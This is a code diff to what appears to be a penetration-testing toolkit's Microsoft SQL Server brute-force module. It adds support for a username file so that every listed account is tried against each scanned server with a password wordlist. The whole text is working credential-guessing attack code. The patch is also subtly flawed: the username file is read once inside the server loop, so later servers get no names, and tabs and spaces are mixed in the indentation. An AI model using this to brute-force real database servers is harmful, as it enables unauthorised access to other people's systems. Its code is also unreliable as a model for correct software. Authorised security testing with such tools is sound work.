@@ -61,9 +61,12 @@ try:
                                 wordlist = raw_input(setprompt(["19","21","22"], "Enter path to a wordlist file [use default wordlist]"))
                                 if wordlist == "": wordlist =  "default"
                                 # specify the user to brute force
-                                username = raw_input(setprompt(["19","21","22"], "Enter the username to brute force [sa]"))
+                                username = raw_input(setprompt(["19","21","22"], "Enter the username to brute force or specify username file (/root/users.txt) [sa]"))
                                 # default to sa
                                 if username == "": username = "sa"
+				if username != "sa":
+					if not os.path.isfile(username):
+						print_status("If you were using a file, its not found, using text as username.")
                                 # import the mssql module from fasttrack
                                 from src.fasttrack import mssql
                                 # choice from earlier if we want to use a filelist or whatnot
@@ -89,6 +92,10 @@ try:
                                 master_list = ""
                                 # set a base counter
                                 counter = 0
+				# if we specified a username list
+				if os.path.isfile(username):
+					usernames = file(username, "r")
+		
                                 if sql_servers != False:
                                         # get rid of extra data from port scanner
                                         sql_servers = sql_servers.replace(":%s OPEN" % (port), "")
@@ -96,13 +103,26 @@ try:
                                         sql_servers = sql_servers.split(",")
                                         # start loop and brute force
                                         for servers in sql_servers:
+
                                                 # this will return the following format ipaddr + "," + username + "," + str(port) + "," + passwords
                                                 if servers != "":
-                                                        sql_success = mssql.brute(servers, username, port, wordlist)
-                                                        if sql_success != False:
-                                                                # after each success or fail it will break into this to the above with a newline to be parsed later
-                                                                master_list = master_list + sql_success + ":"
-                                                                counter = 1
+							# if we aren't using a username file
+							if not os.path.isfile(username):
+                                	                        sql_success = mssql.brute(servers, username, port, wordlist)
+                                	                        if sql_success != False:
+                                	                                # after each success or fail it will break into this to the above with a newline to be parsed later
+                                	                                master_list = master_list + sql_success + ":"
+                                	                                counter = 1
+
+							# if we specified a username list
+							if os.path.isfile(username):
+								for users in usernames:
+									users = users.rstrip()
+									sql_success = mssql.brute(servers, users, port, wordlist)
+									# we wont break out of the loop here incase theres multiple usernames we want to find
+									if sql_success != False:
+										master_list = master_list + sql_success + ":"
+										counter = 1
 
                                 # if we didn't successful attack one
                                 if counter == 0:
